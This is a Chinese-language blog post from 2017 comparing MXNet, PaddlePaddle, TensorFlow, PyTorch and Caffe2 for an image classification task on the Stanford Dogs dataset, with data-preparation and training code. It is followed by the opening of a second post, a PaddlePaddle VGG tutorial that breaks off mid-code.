PyTorch五大深度学习框架2017-10最新评测前言本文将是2017下半年以来，最新也是最全的一个深度学习框架评测。这里的评测并不是简单的使用评测，我们将用这五个框架共同完成一个深度学习任务，从框架使用的易用性、训练的速度、数据预处理的繁琐程度，以及显存占用大小等几个方面来进行全方位的测评，除此之外，我们还将给出一个非常客观，非常全面的使用建议。最后提醒大家本篇文章不仅仅是一个评测，你甚至可以作为五大框架的入门教程。 0. 五大框架概览在评测之前，让我们先对这五大框架进行一个全方位的概览，以及他们目前所处的发展地位。首先在这五大框架中，很多人肯定会问，为什么没有Keras？为什么没有CNTK？在这里我说明一点，本篇文章偏向于工业化级别的应用评测，主要评测主流框架，当然不是说Keras和CNTK就不主流了，文章没有任何利益相关的东西，只不过是Keras本身就拥有多种框架作为后端，因此与它的后端框架对比也就没有任何意义，Keras毫无疑问是速度最慢的。而CNTK由于笔者对Windows无感因此也就没有在评测范围之内(CNTK也是一个优秀的框架，当然也跨平台，感兴趣者可以去踩踩坑)。 TensorFlow可以说是目前发展来说最活跃的，TensorFlow目前已经有72.3k个star，MXNet是11.5k，Caffe2是5.9K, 当然caffe2要推出的稍晚一些，MXNet的官方GitHub repo也是后来又转到Apache的孵化项目中。但是从GitHub受关注度来看，无疑TensorFlow和MXNet是更被看好的。 即使我不做这篇测评，很多人也知道这些框架目前为止有一些这样的评价： TensorFlow API比较繁杂，使用上手困难，乱七八糟的东西很多，但是生态丰富，很多深度学习模型多有TF的实现，有Google大佬加持； MXNet 占用内存小，速度快，非常小巧玲珑，有着天生的开源基因，完全靠社区推动的框架； Caffe2 是面向工业级应用的框架，但是推出较晚，而且主打Python2(execuse me? 2017年了还主打Python2？), 我不由自主的黑一下，从安装部署角度来说用户体验不是非常友好； PyTorch 是Facebook面向学术界推出的一个框架，使用非常简单，搭建神经网络就像Keras和matlab一样，但是我又不得不黑一下，每次还得判断一下是GPU还是CPU？(execuse me? 真的应了那句话，我踩过了tf的坑才知道tf的好)； PaddlePadddle 百度开源的一个框架，国内也有很多人用，我的感受是，非常符合中国人的使用习惯，但是在API的实用性上还有待进一步加强，我曾经写过一篇博客入门PaddlePaddle，不得不说，PaddlePaddle的中文文档写的非常清楚，上手比较简单PaddlePaddle三行代码从入门到精通; 以上评价是以前的评价，夹杂着一丝个人使用感受，最后说一下他们各自目前的好的动向： TensorFlow models这个模型库更新非常快，以前的一些图片分类，目标检测，图片生成文字，生成对抗网络都有现成的深度学习应用的例子，包括现在更新的基于知识图谱的问答项目，神经网络编程机器人等项目，这些官方生态对于一个框架来说非常有用，这无疑是tf的一个长处 MXNet早在几个月前就推出了Gluon这个接口，说白了就是一个Keras，包装了一个更加方便使用的API，但是目前来说还只能实现一些简单的网络的构建，复杂的还是得用原生的API，这里有一个教程链接Gluon资料， 除此之外，MXNet也有一个实例仓库，其中有一些有意思的项目比如语音识别，但是感觉实现的非常不友好，代码几乎凌乱不堪； Caffe2 Caffe2相对于前面两者来说可以说非常弱了，没有丝毫亮点，说好的一个C++高速工业级框架的呢？除了吹牛逼忽悠大众能搞些有用的官方使用文档或者教程出来吗？不好多说什么。 PyTorch就一笔带过了，偏向于学术快速实现，要工业级应用，比如做个模型跑到服务器上或者安卓手机上或者嵌入式上应该搞不来； PaddlePaddle 现在做的还不错，我强调一句，Paddle是唯一一个不配置任何第三方库，克隆直接make就能成功的框架, 被caffe编译虐过的人应该对此深有感触。 说了这么多，相信大家对目前的框架有了一个大致的了解，那么接下来我们就用其中几个框架来完成分类图片这么一个任务吧，这里面将包含图片如何导入模型, 如何写网络， 整个训练的Pipeline等内容。 我们此次评测的任务是图片分类，大家尝试任何一个框架只需要新建一个文件夹，比如mxnet_classifier, 把数据扔到 data 里即可，我们侧重评测数据预处理的复杂程度，和网络编写的复杂程度。 图片下载地址images.tar , annotations.tar. 解压之后得到： paddle_test└── data ├── annotation.tar └── images.tar 解压之后Images下面每一个文件夹是一个类别的狗， 其实分类任务我们只要这个就可以了。 1. MXNet首先上场的，用MXNet吧。建议大家看一下上面我贴出的Gluon李沐大神写的PPT，包含了Gluon和其他框架的区别，以及MXNet在多GPU上训练的优势。 没有安装的安装一下： sudo pip3 install mxnetsudo pip3 install mxnet-cu80sudo pip3 install mxnet-cu80mkl 分别是CPU乞丐版，GPU土豪版，GPU加CPU加速至尊豪华版。安装完了你应该clone一下mxnet的源代码，从tools里面找到im2rec.py这个工具，我们做图片，不管是检测还是分割还是分类，都按照mxnet的逻辑把图片转成二进制的rec格式吧。 我们现在有了Images文件夹，用im2rec.py处理参数这样写： python3 im2rec.py standford_dogs Images/ --list true --recursive true --train-ratio 0.8 --test-ratio 0.2 这一步会生成两个文件： standford_dogs_train.lst standford_dogs_test.lst standford_dogs 是前缀， —list true表示生成列表，recursive用户这种每一个文件夹代表一类的情况，最后在standford_dogs_train.lst 里面的一行是这样的： 5008 27.000000 n02092339-Weimaraner/n02092339_2885.jpg5092 27.000000 n02092339-Weimaraner/n02092339_6548.jpg 第一个数字是图片的总数目的index，第二个应该是类别的index但是这个.0000有点不可思议。好了，有了这个lst文件我们继续用im2rec来生成rec二进制数据吧, 这一步非常简单了，直接load上面的prefix和Images这个图片根目录即可： python3 im2rec.py standford_dogs Images/ mxnet会依次生成train和test的rec文件： OK, mxnet做数据集也不是非常的麻烦，这个过程如果满分五分的话我给4分，pytorch如果不考虑性能的话应该是最直接的，直接从文件夹导入，但是rec格式更快。生成之后总共有了2.8G的文件。 好了，数据准备了，直接写一个网络开始训练罗？我要写一个vgg怎么办？我要看论文吗？我要从第一层开始看网络结构吗？我要换ResNet怎么办？要换Inception怎么办？没有关系！mxnet 官方example包含了大多数这些网络结构！！ ├── alexnet.py├── googlenet.py├── inception-bn.py├── inception-resnet-v2.py├── inception-v3.py├── inception-v4.py├── lenet.py├── mlp.py├── mobilenet.py├── resnet-v1.py├── resnet.py├── resnext.py└── vgg.py 更重要的是，我们看看alexnet的代码： import mxnet as mximport numpy as npdef get_symbol(num_classes, dtype='float32', **kwargs): input_data = mx.sym.Variable(name=\"data\") if dtype == 'float16': input_data = mx.sym.Cast(data=input_data, dtype=np.float16) # stage 1 conv1 = mx.sym.Convolution(name='conv1', data=input_data, kernel=(11, 11), stride=(4, 4), num_filter=96) relu1 = mx.sym.Activation(data=conv1, act_type=\"relu\") lrn1 = mx.sym.LRN(data=relu1, alpha=0.0001, beta=0.75, knorm=2, nsize=5) pool1 = mx.sym.Pooling( data=lrn1, pool_type=\"max\", kernel=(3, 3), stride=(2,2)) # stage 2 conv2 = mx.sym.Convolution(name='conv2', data=pool1, kernel=(5, 5), pad=(2, 2), num_filter=256) relu2 = mx.sym.Activation(data=conv2, act_type=\"relu\") lrn2 = mx.sym.LRN(data=relu2, alpha=0.0001, beta=0.75, knorm=2, nsize=5) pool2 = mx.sym.Pooling(data=lrn2, kernel=(3, 3), stride=(2, 2), pool_type=\"max\") # stage 3 conv3 = mx.sym.Convolution(name='conv3', data=pool2, kernel=(3, 3), pad=(1, 1), num_filter=384) relu3 = mx.sym.Activation(data=conv3, act_type=\"relu\") conv4 = mx.sym.Convolution(name='conv4', data=relu3, kernel=(3, 3), pad=(1, 1), num_filter=384) relu4 = mx.sym.Activation(data=conv4, act_type=\"relu\") conv5 = mx.sym.Convolution(name='conv5', data=relu4, kernel=(3, 3), pad=(1, 1), num_filter=256) relu5 = mx.sym.Activation(data=conv5, act_type=\"relu\") pool3 = mx.sym.Pooling(data=relu5, kernel=(3, 3), stride=(2, 2), pool_type=\"max\") # stage 4 flatten = mx.sym.Flatten(data=pool3) fc1 = mx.sym.FullyConnected(name='fc1', data=flatten, num_hidden=4096) relu6 = mx.sym.Activation(data=fc1, act_type=\"relu\") dropout1 = mx.sym.Dropout(data=relu6, p=0.5) # stage 5 fc2 = mx.sym.FullyConnected(name='fc2', data=dropout1, num_hidden=4096) relu7 = mx.sym.Activation(data=fc2, act_type=\"relu\") dropout2 = mx.sym.Dropout(data=relu7, p=0.5) # stage 6 fc3 = mx.sym.FullyConnected(name='fc3', data=dropout2, num_hidden=num_classes) if dtype == 'float16': fc3 = mx.sym.Cast(data=fc3, dtype=np.float32) softmax = mx.sym.SoftmaxOutput(data=fc3, name='softmax') return softmax 非常非常非常简洁！！！！，只是一个函数，唯一不同的就是类别的数目不同，最后函数根据类别不同返回一个softmax的loss。 最后我们看看怎么把数据导入，然后训练的！！！ \"\"\"train pipe line in mxnet\"\"\"import mxnet as mxfrom symbols.vgg import get_vggdef train(): num_classes = 120 batch_size = 64 # shape not have to be it exactly are data_shape = (3, 64, 64) num_epoch = 50 prefix = 'standford_dogs_model' train_iter = mx.io.ImageRecordIter( path_imgrec=\"data/standford_dogs_train.rec\", data_shape=data_shape, batch_size=batch_size, ) val_iter = mx.io.ImageRecordIter( path_imgrec=\"data/standford_dogs_test.rec\", data_shape=data_shape, batch_size=batch_size, ) model = mx.model.FeedForward( # set mx.gpu(0, 1) for multiple gpu ctx=mx.cpu(), symbol=get_vgg(num_classes=num_classes), num_epoch=num_epoch, learning_rate=0.01, ) model.fit( X=train_iter, eval_data=val_iter, # every 10 iteration log info batch_end_callback=mx.callback.Speedometer(batch_size, 10), epoch_end_callback=mx.callback.do_checkpoint(prefix=prefix) )if __name__ == '__main__': train() 尼玛，简直简单到想哭。大家注意这里get_vgg就是直接从官方的example/image-classification里面拿的，我们训练一个vgg看看。运行之后发现网络已经跑起来了： 温馨提示一下，MXNet貌似已经摒弃了上面的写法，上面的写法和PyTorch一样，是一种生成式的写法，Model和Module的区别就是，后者更加Tensor化，也就是图化，运行之前先把GPU占领一下再说。 OK， MXNet的坑已经踩完了。我来总结一下MXNet不为人知的几点： 这是一个良心框架。可以看出它的开发者再用心的追求速度和易用性，否则也不会推出Gluon这个接口了，这个接口就是让普通开发者更加易用，同时追求速度； MXNet是唯一一个比较中立的框架，你要知道，Google推出TensorFlow可是有小九九的，其内部至少有几套速度更快的纯C写的版本，否则TensorFlow怎么那么慢？不拉开差距怎么来的KPI？怎么让全球开发者为Google服务？(不是Google员工也是不是Google敌对员工，逃…) MXNet的未来潜力很大，我最近在研究MXNet构建复杂的网络，比如Cycle-GAN，比如Seq2Seq的实现，但是不得不承认，这方面TensorFlow更加强大… 2. PaddlePaddle为什么第二个评测用PaddlePaddle？第一，它最近表现很好，但是知道人很少，秉着为开发者引路的原则，增加以下曝光度，其实说实话，很多人不知道PaddlePaddle已经升级到了v2的Python API，而且内部还引入很多Go语言的代码，我没有仔细看这些代码是用来干啥的，但是很显然，PaddlePaddle在追求速度。 对Paddle的评测我这里列举以下Paddle的几个亮点的地方： 相对来说更易用的API，所谓相对是因为，它还是有一些冗杂的地方； 占用内存小，速度快，Paddle在百度内部应该也服务了相当多的项目，因此工业应用不成问题; 中文支持，不想国外的框架，PaddlePaddle还是有着相当多的中文文档的； PaddlePaddle在自然语言处理上有很多现成的历程，比如情感分类，甚至是语音识别都有Demo； PaddlePaddle支持多机多卡训练，也算是集大成者。 关于PaddlePaddle使用的Pipeline异步到我之前写的一个文章传送门。 3. TensorFlow关于tf，还真的是爱恨交加，从刚入手到现在，他的API的繁杂性以及训练的繁琐几乎让人望而却步，不过好在它有一个非常强大的生态。我们来看看TensorFlow做分类任务应该怎么做。 首先，毫无疑问，最好的方法是把图片放到tfrecord这个文件类型中去。但是如何生成tfrecord是个蛋疼的问题，在这里我申明一点，tfrecord和MXNet的rec文件不同： tfrecod是将文件以键值对的形式存放起来了，每个记录就是一个example，而MXNet存储需要先建立一个lst，然后从lst转成二进制文件。好吧其实也差不多，不过你应该能理解我说的意思。 我们看一下一个用来将图片转为tfrecord的代码： from __future__ import absolute_importfrom __future__ import divisionfrom __future__ import print_functionfrom datetime import datetimeimport osimport randomimport sysimport threadingimport numpy as npimport tensorflow as tfclass TFRecordsGenerator(object): \"\"\" this class is using for tf_records generations in image classification use For usages: All images must contains in different folders, TFRecordsGenerator will traverse all folders and find different classes. \"\"\" def __init__(self, name, images_dir, classes_file_path, tf_records_save_dir, num_shards=4, num_threads=4): self.name = name self.classes_file_path = classes_file_path self.images_dir = images_dir self.tf_records_saved_dir = tf_records_save_dir self.num_shards = num_shards self.num_threads = num_threads @staticmethod def _int64_feature(value): if not isinstance(value, list): value = [value] return tf.train.Feature(int64_list=tf.train.Int64List(value=value)) @staticmethod def _bytes_feature(value): return tf.train.Feature(bytes_list=tf.train.BytesList(value=[value])) def _convert_to_example(self, filename, image_buffer, label, text, height, width): \"\"\" Example for image classification :param filename: :param image_buffer: :param label: :param text: :param height: :param width: :return: \"\"\" color_space = 'RGB' channels = 3 image_format = 'JPEG' example = tf.train.Example(features=tf.train.Features(feature=&#123; 'image/height': self._int64_feature(height), 'image/width': self._int64_feature(width), 'image/color_space': self._bytes_feature(tf.compat.as_bytes(color_space)), 'image/channels': self._int64_feature(channels), 'image/class/label': self._int64_feature(label), 'image/class/text': self._bytes_feature(tf.compat.as_bytes(text)), 'image/format': self._bytes_feature(tf.compat.as_bytes(image_format)), 'image/filename': self._bytes_feature(tf.compat.as_bytes(os.path.basename(filename))), 'image/encoded': self._bytes_feature(tf.compat.as_bytes(image_buffer))&#125;)) return example class ImageCoder(object): def __init__(self): self._sess = tf.Session() self._png_data = tf.placeholder(dtype=tf.string) image = tf.image.decode_png(self._png_data, channels=3) self._png_to_jpeg = tf.image.encode_jpeg(image, format='rgb', quality=100) self._decode_jpeg_data = tf.placeholder(dtype=tf.string) self._decode_jpeg = tf.image.decode_jpeg(self._decode_jpeg_data, channels=3) def png_to_jpeg(self, image_data): return self._sess.run(self._png_to_jpeg, feed_dict=&#123;self._png_data: image_data&#125;) def decode_jpeg(self, image_data): image = self._sess.run(self._decode_jpeg, feed_dict=&#123;self._decode_jpeg_data: image_data&#125;) assert len(image.shape) == 3 assert image.shape[2] == 3 return image @staticmethod def _is_png(filename): return '.png' in filename def _process_image(self, filename, coder): with tf.gfile.FastGFile(filename, 'r') as f: image_data = f.read() if self._is_png(filename): print('Converting PNG to JPEG for %s' % filename) image_data = coder.png_to_jpeg(image_data) image = coder.decode_jpeg(image_data) assert len(image.shape) == 3 height = image.shape[0] width = image.shape[1] assert image.shape[2] == 3 return image_data, height, width def _process_image_files_batch(self, coder, thread_index, ranges, name, file_names, texts, labels, num_shards): num_threads = len(ranges) assert not num_shards % num_threads num_shards_per_batch = int(num_shards / num_threads) shard_ranges = np.linspace(ranges[thread_index][0], ranges[thread_index][1], num_shards_per_batch + 1).astype(int) num_files_in_thread = ranges[thread_index][1] - ranges[thread_index][0] counter = 0 for s in range(num_shards_per_batch): shard = thread_index * num_shards_per_batch + s output_filename = '%s-%.5d-of-%.5d.tfrecord' % (name, shard, num_shards) output_file = os.path.join(self.tf_records_saved_dir, output_filename) writer = tf.python_io.TFRecordWriter(output_file) shard_counter = 0 files_in_shard = np.arange(shard_ranges[s], shard_ranges[s + 1], dtype=int) for i in files_in_shard: filename = file_names[i] label = labels[i] text = texts[i] image_buffer, height, width = self._process_image(filename, coder) example = self._convert_to_example(filename, image_buffer, label, text, height, width) writer.write(example.SerializeToString()) shard_counter += 1 counter += 1 if not counter % 1000: print('%s [thread %d]: Processed %d of %d images in thread batch.' % (datetime.now(), thread_index, counter, num_files_in_thread)) sys.stdout.flush() writer.close() print('%s [thread %d]: Wrote %d images to %s' % (datetime.now(), thread_index, shard_counter, output_file)) sys.stdout.flush() shard_counter = 0 print('%s [thread %d]: Wrote %d images to %d shards.' % (datetime.now(), thread_index, counter, num_files_in_thread)) sys.stdout.flush() def _process_image_files(self, file_names, texts, labels): assert len(file_names) == len(texts) assert len(file_names) == len(labels) spacing = np.linspace(0, len(file_names), self.num_threads + 1).astype(np.int) ranges = [] for i in range(len(spacing) - 1): ranges.append([spacing[i], spacing[i + 1]]) print('Launching %d threads for spacings: %s' % (self.num_threads, ranges)) sys.stdout.flush() coord = tf.train.Coordinator() coder = self.ImageCoder() threads = [] for thread_index in range(len(ranges)): args = (coder, thread_index, ranges, self.name, file_names, texts, labels, self.num_shards) t = threading.Thread(target=self._process_image_files_batch, args=args) t.start() threads.append(t) coord.join(threads) print('%s: Finished writing all %d images in data set.' % (datetime.now(), len(file_names))) sys.stdout.flush() def _find_image_files(self): print('Determining list of input files and labels from %s.' % self.images_dir) unique_labels = [l.strip() for l in tf.gfile.FastGFile( self.classes_file_path, 'r').readlines()] labels = [] file_names = [] texts = [] label_index = 1 for text in unique_labels: jpeg_file_path = '%s/%s/*' % (self.images_dir, text) matching_files = tf.gfile.Glob(jpeg_file_path) labels.extend([label_index] * len(matching_files)) texts.extend([text] * len(matching_files)) file_names.extend(matching_files) if not label_index % 100: print('Finished finding files in %d of %d classes.' % ( label_index, len(labels))) label_index += 1 shuffled_index = list(range(len(file_names))) random.seed(12345) random.shuffle(shuffled_index) file_names = [file_names[i] for i in shuffled_index] texts = [texts[i] for i in shuffled_index] labels = [labels[i] for i in shuffled_index] print('Found %d JPEG files across %d labels inside %s.' % (len(file_names), len(unique_labels), self.images_dir)) print('[INFO] Attempting logging out file_names list: &#123;&#125;'.format('\\n'.join(file_names))) return file_names, texts, labels def generate(self): assert not self.num_shards % self.num_threads, ( 'Please make the FLAGS.num_threads commensurate with FLAGS.train_shards') print('Saving results to %s' % self.tf_records_saved_dir) file_names, texts, labels = self._find_image_files() self._process_image_files(file_names, texts, labels) print('All Done! Solved &#123;&#125; images. tf_records file saved into &#123;&#125;.'.format(len(file_names), os.path.abspath( self.tf_records_saved_dir))) 这是我包装的一个类，只要传入路径调用generate就可以生成tfrecord文件。看到这里估计你已经哭了，尼玛这么复杂?!!!!???? 好吧，暂且不管这个具体咋么实现的，再来看看数据怎么load进模型的吧： import tensorflow as tfimport loggingimport numpy as npimport osimport timefrom datasets.tiny5.tiny5 import Tiny5from models.alexnet import AlexNetfrom models.vgg import VGGNetfrom models.fanet import FaNetlogging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(filename)s line:%(lineno)d %(levelname)s %(message)s', datefmt='%a, %d %b %Y %H:%M:%S')tf.app.flags.DEFINE_string('checkpoints_dir', './checkpoints/tiny5/', 'checkpoints save path.')tf.app.flags.DEFINE_string('model_prefix', 'tiny5-alex-net', 'model save prefix.')tf.app.flags.DEFINE_boolean('is_restore', False, 'to restore from previous or not.')tf.app.flags.DEFINE_integer('target_width', 256, 'target width for resize.')tf.app.flags.DEFINE_integer('target_height', 256, 'target height for resize.')tf.app.flags.DEFINE_integer('batch_size', 24, 'batch size for train.')FLAGS = tf.app.flags.FLAGSdef running(is_train=True): if not os.path.exists(FLAGS.checkpoints_dir): os.makedirs(FLAGS.checkpoints_dir) tiny5 = Tiny5( images_dir='./datasets/tiny5/images', classes_file_path='./datasets/tiny5/tiny5_classes.txt', target_height=FLAGS.target_height, target_width=FLAGS.target_width, batch_size=FLAGS.batch_size ) images, labels = tiny5.batch_inputs() print(images) # model = AlexNet(num_classes=5) # model = VGGNet(num_classes=5) model = FaNet(num_classes=5) config = tf.ConfigProto() config.gpu_options.allow_growth = True saver = tf.train.Saver(max_to_keep=2) init_op = tf.group(tf.global_variables_initializer(), tf.local_variables_initializer()) with tf.Session() as sess: coord = tf.train.Coordinator() threads = tf.train.start_queue_runners(sess=sess, coord=coord) sess.run(init_op) start_epoch = 0 checkpoint = tf.train.latest_checkpoint(FLAGS.checkpoints_dir) if FLAGS.is_restore: if checkpoint: saver.restore(sess, checkpoint) logging.info(\"restore from the checkpoint &#123;0&#125;\".format(checkpoint)) start_epoch += int(checkpoint.split('-')[-1]) if is_train: step = 0 logging.info('training start...') try: while not coord.should_stop(): feed_dict = model.make_train_inputs(images, labels) _, loss, step = sess.run( [model.train_op, model.loss, model.global_step], feed_dict=feed_dict ) logging.info('epoch &#123;&#125;, loss &#123;&#125;'.format(step, loss)) except tf.errors.OutOfRangeError: logging.info('optimization done! enjoy color net.') saver.save(sess, os.path.join(FLAGS.checkpoints_dir, FLAGS.checkpoints_prefix), global_step=step) except KeyboardInterrupt: logging.info('interrupt manually, try saving checkpoint for now...') saver.save(sess, os.path.join(FLAGS.checkpoints_dir, FLAGS.model_prefix), global_step=step) logging.info('last epoch were saved, next time will start from epoch &#123;&#125;.'.format(step)) finally: coord.request_stop() coord.join(threads) else: logging.info('start inference...') inference_image_path = './images/1.png' input_image = tiny5.single_image_input(inference_image_path) feed_dict = model.make_inference_inputs(input_image) outputs = sess.run([model.inference_outputs(n_top=2)], feed_dict=feed_dict) print(outputs)def main(args): running(args)if __name__ == '__main__': tf.app.run() 这个训练的代码，大概的训练步骤分为： 使用tf.ConfigProto()来生成一个config，设置gpu自动生长，同时设置一个saver，这个saver就是最大保存的数目； 设置初始化的变量op，设置一个tf.Train.Coordinator()来作为训练协调者，初始化图； for循环所有的epoch，在每次循环里面catch一下tf.errors.OutOfRangeError表示一个batch训练完了，catch一下KeyBoardInterrupt； 最后是保存模型 大家可以感受一下TensorFlow一整套流程下来的复杂程度。这里面还没有写我的网络，没有写我的数据DataLoader，整个代码在我的GitHub仓库可以找到原始代码，传送门, 如果你觉得那个项目过于陈旧可以跟进我的一些最新的项目，我近期在TensorFlow上做的工作有： 用Google最新nmt模型训练聊天机器人； 使用GAN做Cylce-GAN生成； 使用KnowledgeDatabase和知识图谱做问答系统； 目标检测和分割等常规性工作 4. PyTorchPyTorch如果做图片预测我就不详细讲了，很多人说PyTorch很简单，但是我并没有觉得简单到哪里去，我总结一下PyTorch目前来说一些优点吧。 立即式编程，也就是运行立马出结果，不同于TensorFlow的图式，你必须把所有程序写完之后才知道结果什么； 安装也比较方便，但是跨平台部署就比较麻烦了，这也和PyTorch的定位有关，当然PyTorch刚推出来的时候有几篇官方教程写的不错，主要是RNN文本生成，Seq2Seq翻译的实现，有兴趣的同学可以看一下，但是都是非常简单的实现，跟TensorFlow的官方例子差距蛮大； 只是构建网络比较简单，但是具体训练的PipeLine还是有点麻烦，尤其是我每次变量还得指定是CPU还是GPU，每次load模型的时候还得load是CPU还是GPU，个人感觉略麻烦； PyTorch推出来的时候很火，现在貌似熄火了…. 5. Caffe2caffe2 不得不提一下，caffe的进化版本？？？？caffe用着还好，c++调接口还蛮方便，例子也很多，caffe2为毛主打python，还python2？？？不过这也跟caffe2定位于工业使用有关，但是总体来说有这么几点： 感觉没有多少社区，虽然caffe非常多公司用，但是那毕竟是第一代版本，一般公司用用还行，容易与时代脱节； caffe2也没有多少亮点，官方的教程我是没有看到什么实质性的东西，后期也没有更多的example； 好像C++接口也不是非常友好，至少在例子上很少….一个框架推出来，不教人去用那推出来有啥意思？ 总结我写文章喜欢一目了然，文章结构大致对比了5种框架的优缺点，那么我直接给使用者一些建议，防止大家采坑： 如果你是深度学习老鸟，你应该选择TensorFlow，但是我不得不告诉你TensorFlow在1.2版本推出来的API，在1.4版本很有可能就大改了….. 如果你是深度学习菜鸟，你应该选择MXNet或者PaddlePaddle，很多人会说，我曹，为什么不用Keras？？好吧，Keras当然也可以用，但是不建议一直用，还是得熟悉一下稍微底层一些的框架； 如果你是….如果你是小学生？高中生或者初中生，你可以用一下PaddlePaddle，因为你英文可能不太好。 如果你想跟进我的更多TensorFlow项目欢迎在Github寻找我的联系方式，加入QQ群交流。 This article was original written by Jin Tian, welcome re-post, first come with https://jinfagang.github.io . but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"PaddlePaddle系列之三行代码从入门到精通","slug":"PaddlePaddle系列之三行代码从入门到精通","date":"2017-10-11T07:43:43.000Z","updated":"2017-10-13T13:27:00.000Z","comments":true,"path":"2017/10/11/PaddlePaddle系列之三行代码从入门到精通/","link":"","permalink":"http://yoursite.com/2017/10/11/PaddlePaddle系列之三行代码从入门到精通/","excerpt":"本文介绍 PaddlePaddle系列之三行代码从入门到精通","text":"本文介绍 PaddlePaddle系列之三行代码从入门到精通 PaddlePaddle系列之三行代码从入门到精通前言这将是PaddlePaddle系列教程的开篇，属于非官方教程。既然是非官方，自然会从一个使用者的角度出发，来教大家怎么用，会有哪些坑，以及如何上手并用到实际项目中去。 我之前写过一些关于tensorflow的教程，在我的简书上可以找到，非常简单基础的一个教程，但是备受好评，因为国内实在是很难找到一个系列的关于这些深度学习框架的教程。因此在这里，我来给PaddlePaddle也写一个类似的教程，不复杂，三行代码入门。 三行代码PaddlePaddle从入门到精通PaddlePaddle是百度大力推出的一个框架，不得不说相比于tensorflow，PaddlePaddle会简单很多，接下来我会细说。同时百度在人工智能方面的功底还是非常深厚，我曾经在腾讯实习，类似于AT这样的公司，甚至没有一个非常成型的框架存在。 既然是三行代码精通PaddlePaddle，那么得安装一下PaddlePaddle。就目前来说，最好的办法是build from source。步骤如下 （注意，这里是CPU版本，GPU版本的源码编译过程后续补充，我们先用CPU来熟悉API）： # clone 最新代码到paddlegit clone https://github.com/PaddlePaddle/Paddle paddlecd paddlemkdir buildcd buildcmake ..make all -j8sudo make install# 安装python接口，注意paddlepaddle目前貌似只支持python2，因此在写脚本的时候一定要兼容一下python3# 这里是mac的情况下，如果是ubuntu /usr/local/opt 应该直接是/opt/sudo python -m pip install /usr/local/opt/paddle/share/wheels/*.whl# 或者直接sudo pip2 install /usr/local/opt/paddle/share/wheels/*.whl 好了，看上去应该算是安装完了。接下来我们用三行代码来测试一下? PaddlePaddle在python API上0.10有较大的变化，所以直接import一下v2版本的API。如果可以说明PaddlePaddle安装没有问题。这里赞一下百度的技术功底和用户体验，这尼玛要是caffe或者caffe2编译出错概率100%不说，python安装了也不能import，PaddlePaddle一步到位，非常牛逼。 闲话不多说，直接三行代码来熟悉一下PaddlePaddle的API。 三行代码来了接下来要做的事情是，用PaddlePaddle搭建一个3层MLP网络，跑一个二维的numpy随机数据，来了解一下PaddlePaddle从数据喂入到训练的整个pipeline吧。 首先我们这个教程先给大家展示一个图片分类器，用到的数据集是Stanford Dogs 数据集， 下载链接, 大概800M, 同时下载一下annotations， 大概21M。下载好了我们用一个paddle_test的文件夹来做这个教程吧。 mkdir paddle_testcd paddle_testmkdir data 把所有的images 和 annotations扔到data里面去，解压一下： paddle_test└── data ├── annotation.tar └── images.tar 顺便说一下，这里的annotations是为后面用paddlepaddle做分割做准备，本次分类任务，只需要一个images.tar就可以了，所有图片被放在了该类别的文件夹下面，以后处理其他分类任务时，只需要把不同类别放在文件夹就OK了，甚至不用改代码，非常方便，这比MXNet要有道理很多，多数情况下我们根本不需要海量图片训练，也没有必要搞个什么imrecord的数据格式，MXNet导入图片真心蛋疼，没有Pytorch方便，但是Pytorch得运行速度堪忧。 OK，将images.tar解压，会得到120个文件夹，也就是120个类别，每个类别里面都是一种狗狗图片。比如这张是一只 Beagle： 我们现在要来处理一下这些蠢狗。 开始写三行代码好了，开始写三行代码了. def vgg_bn_drop(input_data):def event_handler(event):def train(): 实际上PaddlePaddle的使用也就是三行代码的事情，首先是网络构建，这里我们构建一个VGG网络，其次是event的处理函数，这个机制是PaddlePaddle独有的，PaddlePaddle把所有的训练过程都包装成了一个trainer，然后调用这个event_handler来处理比如打印loss信息这样的事情。OK，我们一步一步来，先来看一下train的过程把： def train(): data_dim = 3 * 32 * 32 class_dim = 10 image = paddle.layer.data( name=\"image\", type=paddle.data_type.dense_vector(data_dim)) net = vgg_bn_drop(image) out = paddle.layer.fc(input=net, size=class_dim, act=paddle.activation.Softmax()) lbl = paddle.layer.data( name=\"label\", type=paddle.data_type.integer_value(class_dim)) cost = paddle.layer.classification_cost(input=out, label=lbl) parameters = paddle.parameters.create(cost) print(parameters.keys()) momentum_optimizer = paddle.optimizer.Momentum( momentum=0.9, regularization=paddle.optimizer.L2Regularization(rate=0.0002 * 128), learning_rate=0.1 / 128.0, learning_rate_decay_a=0.1, learning_rate_decay_b=50000 * 100, learning_rate_schedule='discexp') # Create trainer trainer = paddle.trainer.SGD(cost=cost, parameters=parameters, update_equation=momentum_optimizer) reader = paddle.batch( paddle.reader.shuffle( paddle.dataset.cifar.train10(), buf_size=50000), batch_size=128) feeding = &#123;'image': 0, 'label': 1&#125; trainer.train( reader=reader, num_passes=200, event_handler=event_handler, feeding=feeding) PaddlePaddle的网络训练流程分为几个步骤： 首先定义网络，这里的网络不包括最后一层的softmax； 创建一个cost，cost当然就需要一个网络的输出和lable了； 通过这个cost来创建网络训练的参数，非常简单明了； 最后是优化器，这里定义反向传播的正则项，学习速率调整策略等； 通过上面这些创建一个trainer； 最后这个trainer要训练起来，还需要持续的数据喂入，时间处理函数，和喂入的方式。 接着我们看一下网络定义和事件处理函数： # define VGG networkdef vgg_bn_drop(input_data): def convolution_block(ipt, num_filter, groups, dropouts, num_channels=None): return paddle.networks.img_conv_group( input=ipt, num_channels=num_channels, pool_size=2, pool_stride=2, conv_num_filter=[num_filter] * groups, conv_filter_size=3, conv_act=paddle.activation.Relu(), conv_with_batchnorm=True, conv_batchnorm_drop_rate=dropouts, pool_type=paddle.pooling.Max()) convolution_1 = convolution_block(input_data, 64, 2, [0.3, 0], 3) convolution_2 = convolution_block(convolution_1, 128, 2, [0.4, 0]) convolution_3 = convolution_block(convolution_2, 256, 3, [0.4, 0.4, 0]) convolution_4 = convolution_block(convolution_3, 512, 3, [0.4, 0.4, 0]) convolution_5 = convolution_block(convolution_4, 512, 3, [0.4, 0.4, 0]) drop = paddle.layer.dropout(input=convolution_5, dropout_rate=0.5) fc1 = paddle.layer.fc(input=drop, size=512, act=paddle.activation.Linear()) bn = paddle.layer.batch_norm( input=fc1, act=paddle.activation.Relu(), layer_attr=paddle.attr.Extra(drop_rate=0.5)) fc2 = paddle.layer.fc(input=bn, size=512, act=paddle.activation.Linear()) return fc2def event_handler(event): if isinstance(event, paddle.event.EndIteration): if event.batch_id % 100 == 0: print(\"\\nPass %d, Batch %d, 